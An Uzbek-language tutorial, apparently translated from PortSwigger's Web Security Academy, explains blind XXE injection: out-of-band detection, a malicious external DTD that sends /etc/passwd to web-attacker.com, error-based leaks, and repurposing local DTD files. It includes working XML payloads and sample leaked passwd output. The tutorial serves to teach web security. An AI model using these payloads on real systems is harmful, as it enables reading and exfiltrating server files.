# Blind XXE ineksiyasi

Biz ushbu bo'limda Blind XXE ineksiya nima ekanligi haqida gaplashamiz va uni topish usullarini ham o'rganamiz.

## <mark style="color:yellow;">Blind XXE ineksiya nima ?</mark> <a href="#blind-xxe-inektsiya-nima" id="blind-xxe-inektsiya-nima"></a>

Saytning qayeridadir XXE ineksiyasi bo'lsayu lekin response hech qanday External entity qiymatini qaytarmasa Blind XXE ineksiya sodir bo'ladi. Bu degani to'g'ridan-to'g'ri server-side fayl almashish imkoni yo'q va shunaqa ekan Blind XXE ineksiyani oddiy XXE ineksiyaga qaraganda exploit qilish ancha qiyin.

Buni amalga oshirishning ikkita asosiy yo'li bor:

* Siz OAST tarmog'ining o'zaro ta'sirini ishga tushirishingiz mumkin, ba'zida bu o'zaro tasirli ma'lumotlar paytida maxfiy ma'lumotlarni topadi
* Siz XML error lari orqali maxfiy ma'lumotlarni olishingiz mumkin.

## <mark style="color:yellow;">Blind XXE ni out-of-band (OAST) orqali aniqlash usullari</mark> <a href="#blind-xxe-ni-out-of-band-oast-orqali-aniqlash-usullari" id="blind-xxe-ni-out-of-band-oast-orqali-aniqlash-usullari"></a>

Siz [<mark style="color:yellow;">SSRFni XXE yordamida aniqlash xujumi</mark>](xxe-ineksiya.md#ssrf-hujumlarini-amalga-oshirish-uchun-xxedan-foydalanish) bilan bir xil texnikadan foydalangan holda Blind XXE ni aniqlashingiz mumkin, lekin siz boshqarayotgan tizimga OAST tarmog'ining o'zaro ta'sirini ishga tushirishingiz mumkin. Misol uchun siz tashqi entiti ni e'lon qilishingiz mumkin:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Keyin XML ichidagi ma'lumotlar qiymatida berilgan entitidan foydalanasiz.

Ushbu XXE xujumi serverni kitilgan URL manziliga HTTP so'rov yuborishiga olib keladi. Natijada haker DNS lookup va HTTP so'rovini kuzatishi va shu bilan XXE xujumi muvaffaqiyatli bo'lganligini aniqlashi mumkin.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Out-of-band o'zaro tasiri yordamida blind XXE ≫](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
{% endhint %}

Ba'zida XXE hujumlar, oddiy entitilardan foydalangan holda sayt tomonidan kiritilgan tekshiruvlar yoki foydalanilayotgan XML parsing tufayli bloklanadi. Bunday holatlarda siz XML parametr entitilardan foydalanishingiz mumkin. XML parametr entitylari XML entitylarining maxsus turi bo'lib, unga faqat DTD doirasidagi boshqa joyga murojaat qilish mumkin. Hozir siz faqat ikkita narsani bilishingiz kerak. Birinchidan, XML parametr entity deklaratsiyasi, entity nomidan oldingi % belgisini o'z ichiga oladi:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

Ikkinchidan, parametr entitylari odatdagi &-ning o'rniga % belgisi yordamida qilinadi:

```xml
%myparameterentity;
```

Bu digani siz Blind XXE xujumini, out-of-band aniqlash usuli va XML parametr entitilari bunday ko'rinishda bo'lgan holatidagi payload yozib amalga oshira olasiz:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Ushbu XXE payload xxe deb nomlangan XML parametr entityni e'lon qiladi va keyin DTD ichidagi entitydan foydalanadi. Bu xujum muvaffaqiyatli bo'lganligini tasdiqlashga DNS lookup va hakerning domeniga kelgan HTTP so'rov sabab bo'ladi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [XML parametr entitylari orqali out-of-band o'zaro tasiri yordamida blind XXE  ≫](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
{% endhint %}

## <mark style="color:yellow;">Olinadigan ma'lumotlarni out-of-band orqali olish uchun Blind XXE dan foydalanish</mark> <a href="#blind-xxe-ni-siqib-chiqariladigan-out-of-band-malumotlarini-exploit-qilish" id="blind-xxe-ni-siqib-chiqariladigan-out-of-band-malumotlarini-exploit-qilish"></a>

Blind XXE zaifliklarini out-of-band orqali aniqlash bu juda yaxshi ammo bu zaiflik sizga uni qanday qilib exploit qilish mumkinligini ko'rsatmasligi mumkin. Haker maxfiy ma'lumotlarni olishni hohlayd. Bunga Blind XXE zaifligi orqali erishish mumkin, ammo bu uchun haker o'zi boshqaradigan serverga zararli DTD-ni joylashtirishi va keyin tashqi DTD-ni tarmoq ichidagi XXE payloadi ichidan ishga tushirishi kerak.

/etc/passwd fayli tarkibini o'chirish uchun zararli DTD misoli quyidagicha:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Ushbu DTD quyidagilarni bajaryapti:

* `file` nomli XML parametr entitysini e'lon qilyapti va unining qiymati sifatida  `/etc/passwd` faylini belgilayapti
* `Exfiltrate` deb nomlangan boshqa XML parametr, entityning dinamik deklaratsiyasini o'z ichiga olgan `eval` deb nomlangan XML parametr entityni e'lon qildi. `Exfiltrate` entitysi URL so'rovlar qatoridagi `file` entitysining qiymatini o'z ichiga olgan haker serveriga HTTP so'rov yuborish orqali aniqlanadi.
* `eval` entitysi `exfiltrate` entitysini ishlashiga sabab bo'ladi.
* `exfiltrate` URL ni aniqlaydi va so'rov yuboradi

Keyin haker zararli DTD ni o'zi boshqaradigan tizimga joylashtirishi kerak, odatda uni o'z serveriga yuklash orqali amalga oshiradi. Masalan, haker zararli DTD ga quyidagi URL manzilini kiritishi mumkin:

```uri
http://web-attacker.com/malicious.dtd
```

Nihoyat endi haker ushbu zararli DTD ni himoyasiz saytga yuklashi mumkin:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Ushbu XXE payload `xxe` deb nomlangan XML parametrdan entitydan foydalanadi va uni DTD ichida ishlatadi. Bu XML parseriga haker serveridan tashqi DTD ni olishiga va uni inline talqinida olib kelishga majburlaydi. Bu ishlar tugagandan so'ng hakerni serveriga /etc/passwd fayli yuklanadi.

{% hint style="info" %}
**Eslatma:**

Bu usul, tarkibida yangi qator belgilarni o'z ichiga olgan `/etc/passwd` fayl kabi ba'zi fayl tarkiblari bilan ishlamasligi mumkin. Buning sababi shundaki, ba'zi XML parserlar URL ichida ruxsat berilgan belgilarni tasdiqlovchi API yordamida e'lon qilingan tashqi entityda URLni olib keladi. Bunday holda, HTTP o'rniga FTP protokolidan foydalanish mumkin. Ba'zida yangi qator belgilarini o'z ichiga olgan ma'lumotlarni o'chirib tashlab bo'lmaydi, shuning uchun uning o'rniga `/etc/hostname` kabi faylni yo'naltirish mumkin.
{% endhint %}

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Ma'lumotlarni zararli tashqi DTD yordamida exfiltatsiya qilish uchun XXEdan foydalanish ≫](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
{% endhint %}

## <mark style="color:yellow;">Xatolik habarlari orqali malumotlarni olish uchun Blind XXEdan foydalanish.</mark> <a href="#blind-xxe-error-lar-orqali-exploit-qilish" id="blind-xxe-error-lar-orqali-exploit-qilish"></a>

Blind XXE dan foydalanishning yana bir usuli bu siz olishni hohlagan mahfiy ma'lumotlarni o'z ichiga olgan xatolik habarlarini keltirib chiqarish uchun XML parsing hatoliklarini yuzaga keltirish. Agar sayt responseda xato xabarini qaytarsa, bu samara beradi.

Siz quyuidagi kabi zararli tashqi DTD dan foydalanib, etc/passwd fayl takibini o'z ichiga olgan XML parsing error habarini yuzaga keltira olasiz&#x20;

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Ushbu DTD quyidagilarni bajaradi:

* `file` deb nomlangan XML parametr entitysini e'lon qilyapti va unining qiymati sifatida  `/etc/passwd` faylini belgilayapti
* `eval`deb nomlangan XML parametr entitysi,  `error` deb nomlangan boshqa XML parametr entity deklaratsiyasini o'z ichiga olgan. `Error` entity, `file` nomli entity qiymatini o'z ichiga olgan mavjud bo'lmagan faylni yuklash orqali baholanadi.
* &#x20;`eval` entitysidan foydalanmoqda, bu esa dinamik deklaratsiyani amalga oshirishga sabab bo'ladigan `error`entitydan foydalanadi.
* `error` entitydan foydalanmoqda,  shuning uchun uning qiymati mavjud bo'lmagan faylni yuklashga uringanida aniqlanadi, natijada mavjud bo'lmagan fayl nomini o'z ichiga olgan xato xabarda `/etc/passwd` fayl tarkibi paydo bo'ladi.

Zararli tashqi DTDni chaqirish quyidagi kabi xato xabarni yuzaga keltiradi

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Xatolik habarl ari orqali ma'lumotlarni olish uchun blin XXEdan foydalanish ≫](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
{% endhint %}

## <mark style="color:yellow;">Local DTDni o'zgartirish orqali Blind XXE dan foydalanish</mark> <a href="#exploiting-blind-xxe-by-repurposing-a-local-dtd" id="exploiting-blind-xxe-by-repurposing-a-local-dtd"></a>

Ilgarigi texnika tashqi DTD bilan yaxshi ishlaydi, lekin odatda `DOCTYPE` element ichida to'liq belgilangan[ <mark style="color:yellow;">ichki DTD</mark>](xml-entitylar.md#document-type-definition-nima) bilan yaxshi ishlamaydi. Buning sababi, bu texnika boshqa parametr entity ichida XML parametr entityidan foydalanishni o'z ichiga oladi. XML spetsifikatsiyasiga ko'ra, external DTDlarda bunga ruxsat beriladi, lekin ichki DTDlarda emas.

Xo'sh, out-of-band harkatlari bloklanganda blin XXE zaifliklari haqida nima deyish mumkin ? Siz out-of-band ulanishi orqali ma'lumotlarni ololmaysiz va nasfaviy serverdan ham tashqi DTDni yuklay olmaysiz.

Bunday holatda, XML tili spetsifikatsiyasidagi loophol orqali maxfiy ma'lumotlarni o'z ichiga olgan xato xabarlarini yuzaga keltirishingiz mumkin. Agar XML hujjatining ichki va tashqi DTD deklaratsiyalarining birikmasdan foydalansa, ichki DTD tashqi DTDda e'lon qilingan entitylarni qayta e'lon qilishi mumkin. E'lon qilinganida esa, boshqa parametr entityi e'lon qilinishi doirasida XML parametr entitydan foydalanish bo'yicha cheklov kamaytiriladi.

Bu shuni anglatadiki, agar ular foydalanadigan XML parametr entitysi tashqi DTD ichida e'lon qilingan entityni qayta aniqlasa hacker [<mark style="color:yellow;">xatoga asoslangan XXE</mark> ](blind-xxe-ineksiyasi.md#blind-xxe-error-lar-orqali-exploit-qilish)texnikasidan, ichki DTD ichida foydalanishi mumkin. Albatta, agar out-of-band ulanishlar bloklangan bo'lsa, tashqi DTDni masofadan yuklab bo'lmaydi.&#x20;

Buning o'rniga, sayt serverida lokal tarzda tashqi DTD fayli bo'lishi kerak. Hujum asosan, serverdagi DTD faylini chaqirishni va e'lon qilingan entityni maxfiy ma'lumotlar ham qo'shilib keladigan parsing xatoligini keltirib chiqaradigan tarzda qayta e'lon qilishni o'z ichiga oladi. Bu usul Arseniy Sharoglazov tomonidan asos solingan va [<mark style="color:yellow;">2018-yildagi eng yaxshi 10 veb-xakerlik</mark>](https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018#7) texnikamizda 7-oʻrinni egallagan .

Masalan, serverning quyidagi `/usr/local/app/schema.dtd` joylashuvida DTD fayl bor deylik. Bu DTD fayli `custom_entity` deb nomlangan entityni e'lon qiladi. Hacker quyidagi kabi biriktirilgan DTDni yuborish orqali `/etc/passwd`faylining tarkibini o'z ichiga olgan XML parser xatolik xabarini yuzaga keltirishi mumkin:

```xml
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error; 
'>
%local_dtd;
]>
```

Ushbu DTD quyidagilarni bajaradi:

* Serverdagi tashqi DTD faylining tarkibini o'z ichiga olgan `local_dtd`  nomli XML parametr entityini e'lon qiladi.
* Tashqi DTD faylida avvaldan e'lon qilingan `custom_entity` nomli XML parametr entityini qayta e'lon qiladi.  `/etc/passwd` fayl tarkibini ham ko'rsatadigan xatolik xabarini yuzaga keltirish uchun, [error-based XXE exploit](blind-xxe-ineksiyasi.md#blind-xxe-error-lar-orqali-exploit-qilish) ni o'z ichiga olgan entityni qayta e'lon qiladi.
* `local_dtd` nomli entitydan foydalanadi, shuning uchun `custom_entity` nomli entityning qiymatini o'z ichiga olgan tashqi DTDni talqin qiladi.

## <mark style="color:yellow;">Mavjud DTD faylini o'zgartirish uchun uni topish</mark> <a href="#locating-an-existing-dtd-file-to-repurpose" id="locating-an-existing-dtd-file-to-repurpose"></a>

Ushbu XXE hujumi serverda turgan DTD-ni o'zgartirishni o'z ichiga olganligi uchun  to'g'ri keladigan faylni topishni talab qiladi. Bu aslida juda oddiy. Web sayt XML parser tomonidan yuborilgan har qanday xatolik xabarlarini qaytarganligi sababli, siz lokal DTD fayllarini faqat ichki DTD ichidan yuklashga urinib osongina qidirishingiz mumkin.

Masalan, GNOMEdan foydalanadigan Linux tizimlari ko'pincha `/usr/share/yelp/dtd/docbookx.dtd` joylashuvida DTD fayliga ega. Quyidagi XXE payloadini yuborish orqali ushbu fayl mavjudligini tekshirishingiz mumkin, agar bu fayl bo'lmasa xatolik sodir bo'ladi.

```xml
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Faylni topish uchun keng tarqalgan DTD fayllar ro'yxatini sinab ko'rganingizdan so'ng, faylning nusxasini olishingiz va qayta e'lon qilishingiz mumkin bo'lgan entityni topish uchun uni ko'zdan kechirib chiqishingiz kerak. DTD fayllarini o'z ichiga olgan ko'plab umumiy tizimlar open source bo'lganligi sababli, odatda Internetdan qidirish orqali fayllar nusxasini tezda olishingiz mumkin.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Lokal DTD-ni o'zgartirish orqali ma'lumotni olish uchun XXE-dan foydalanish ≫](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
{% endhint %}
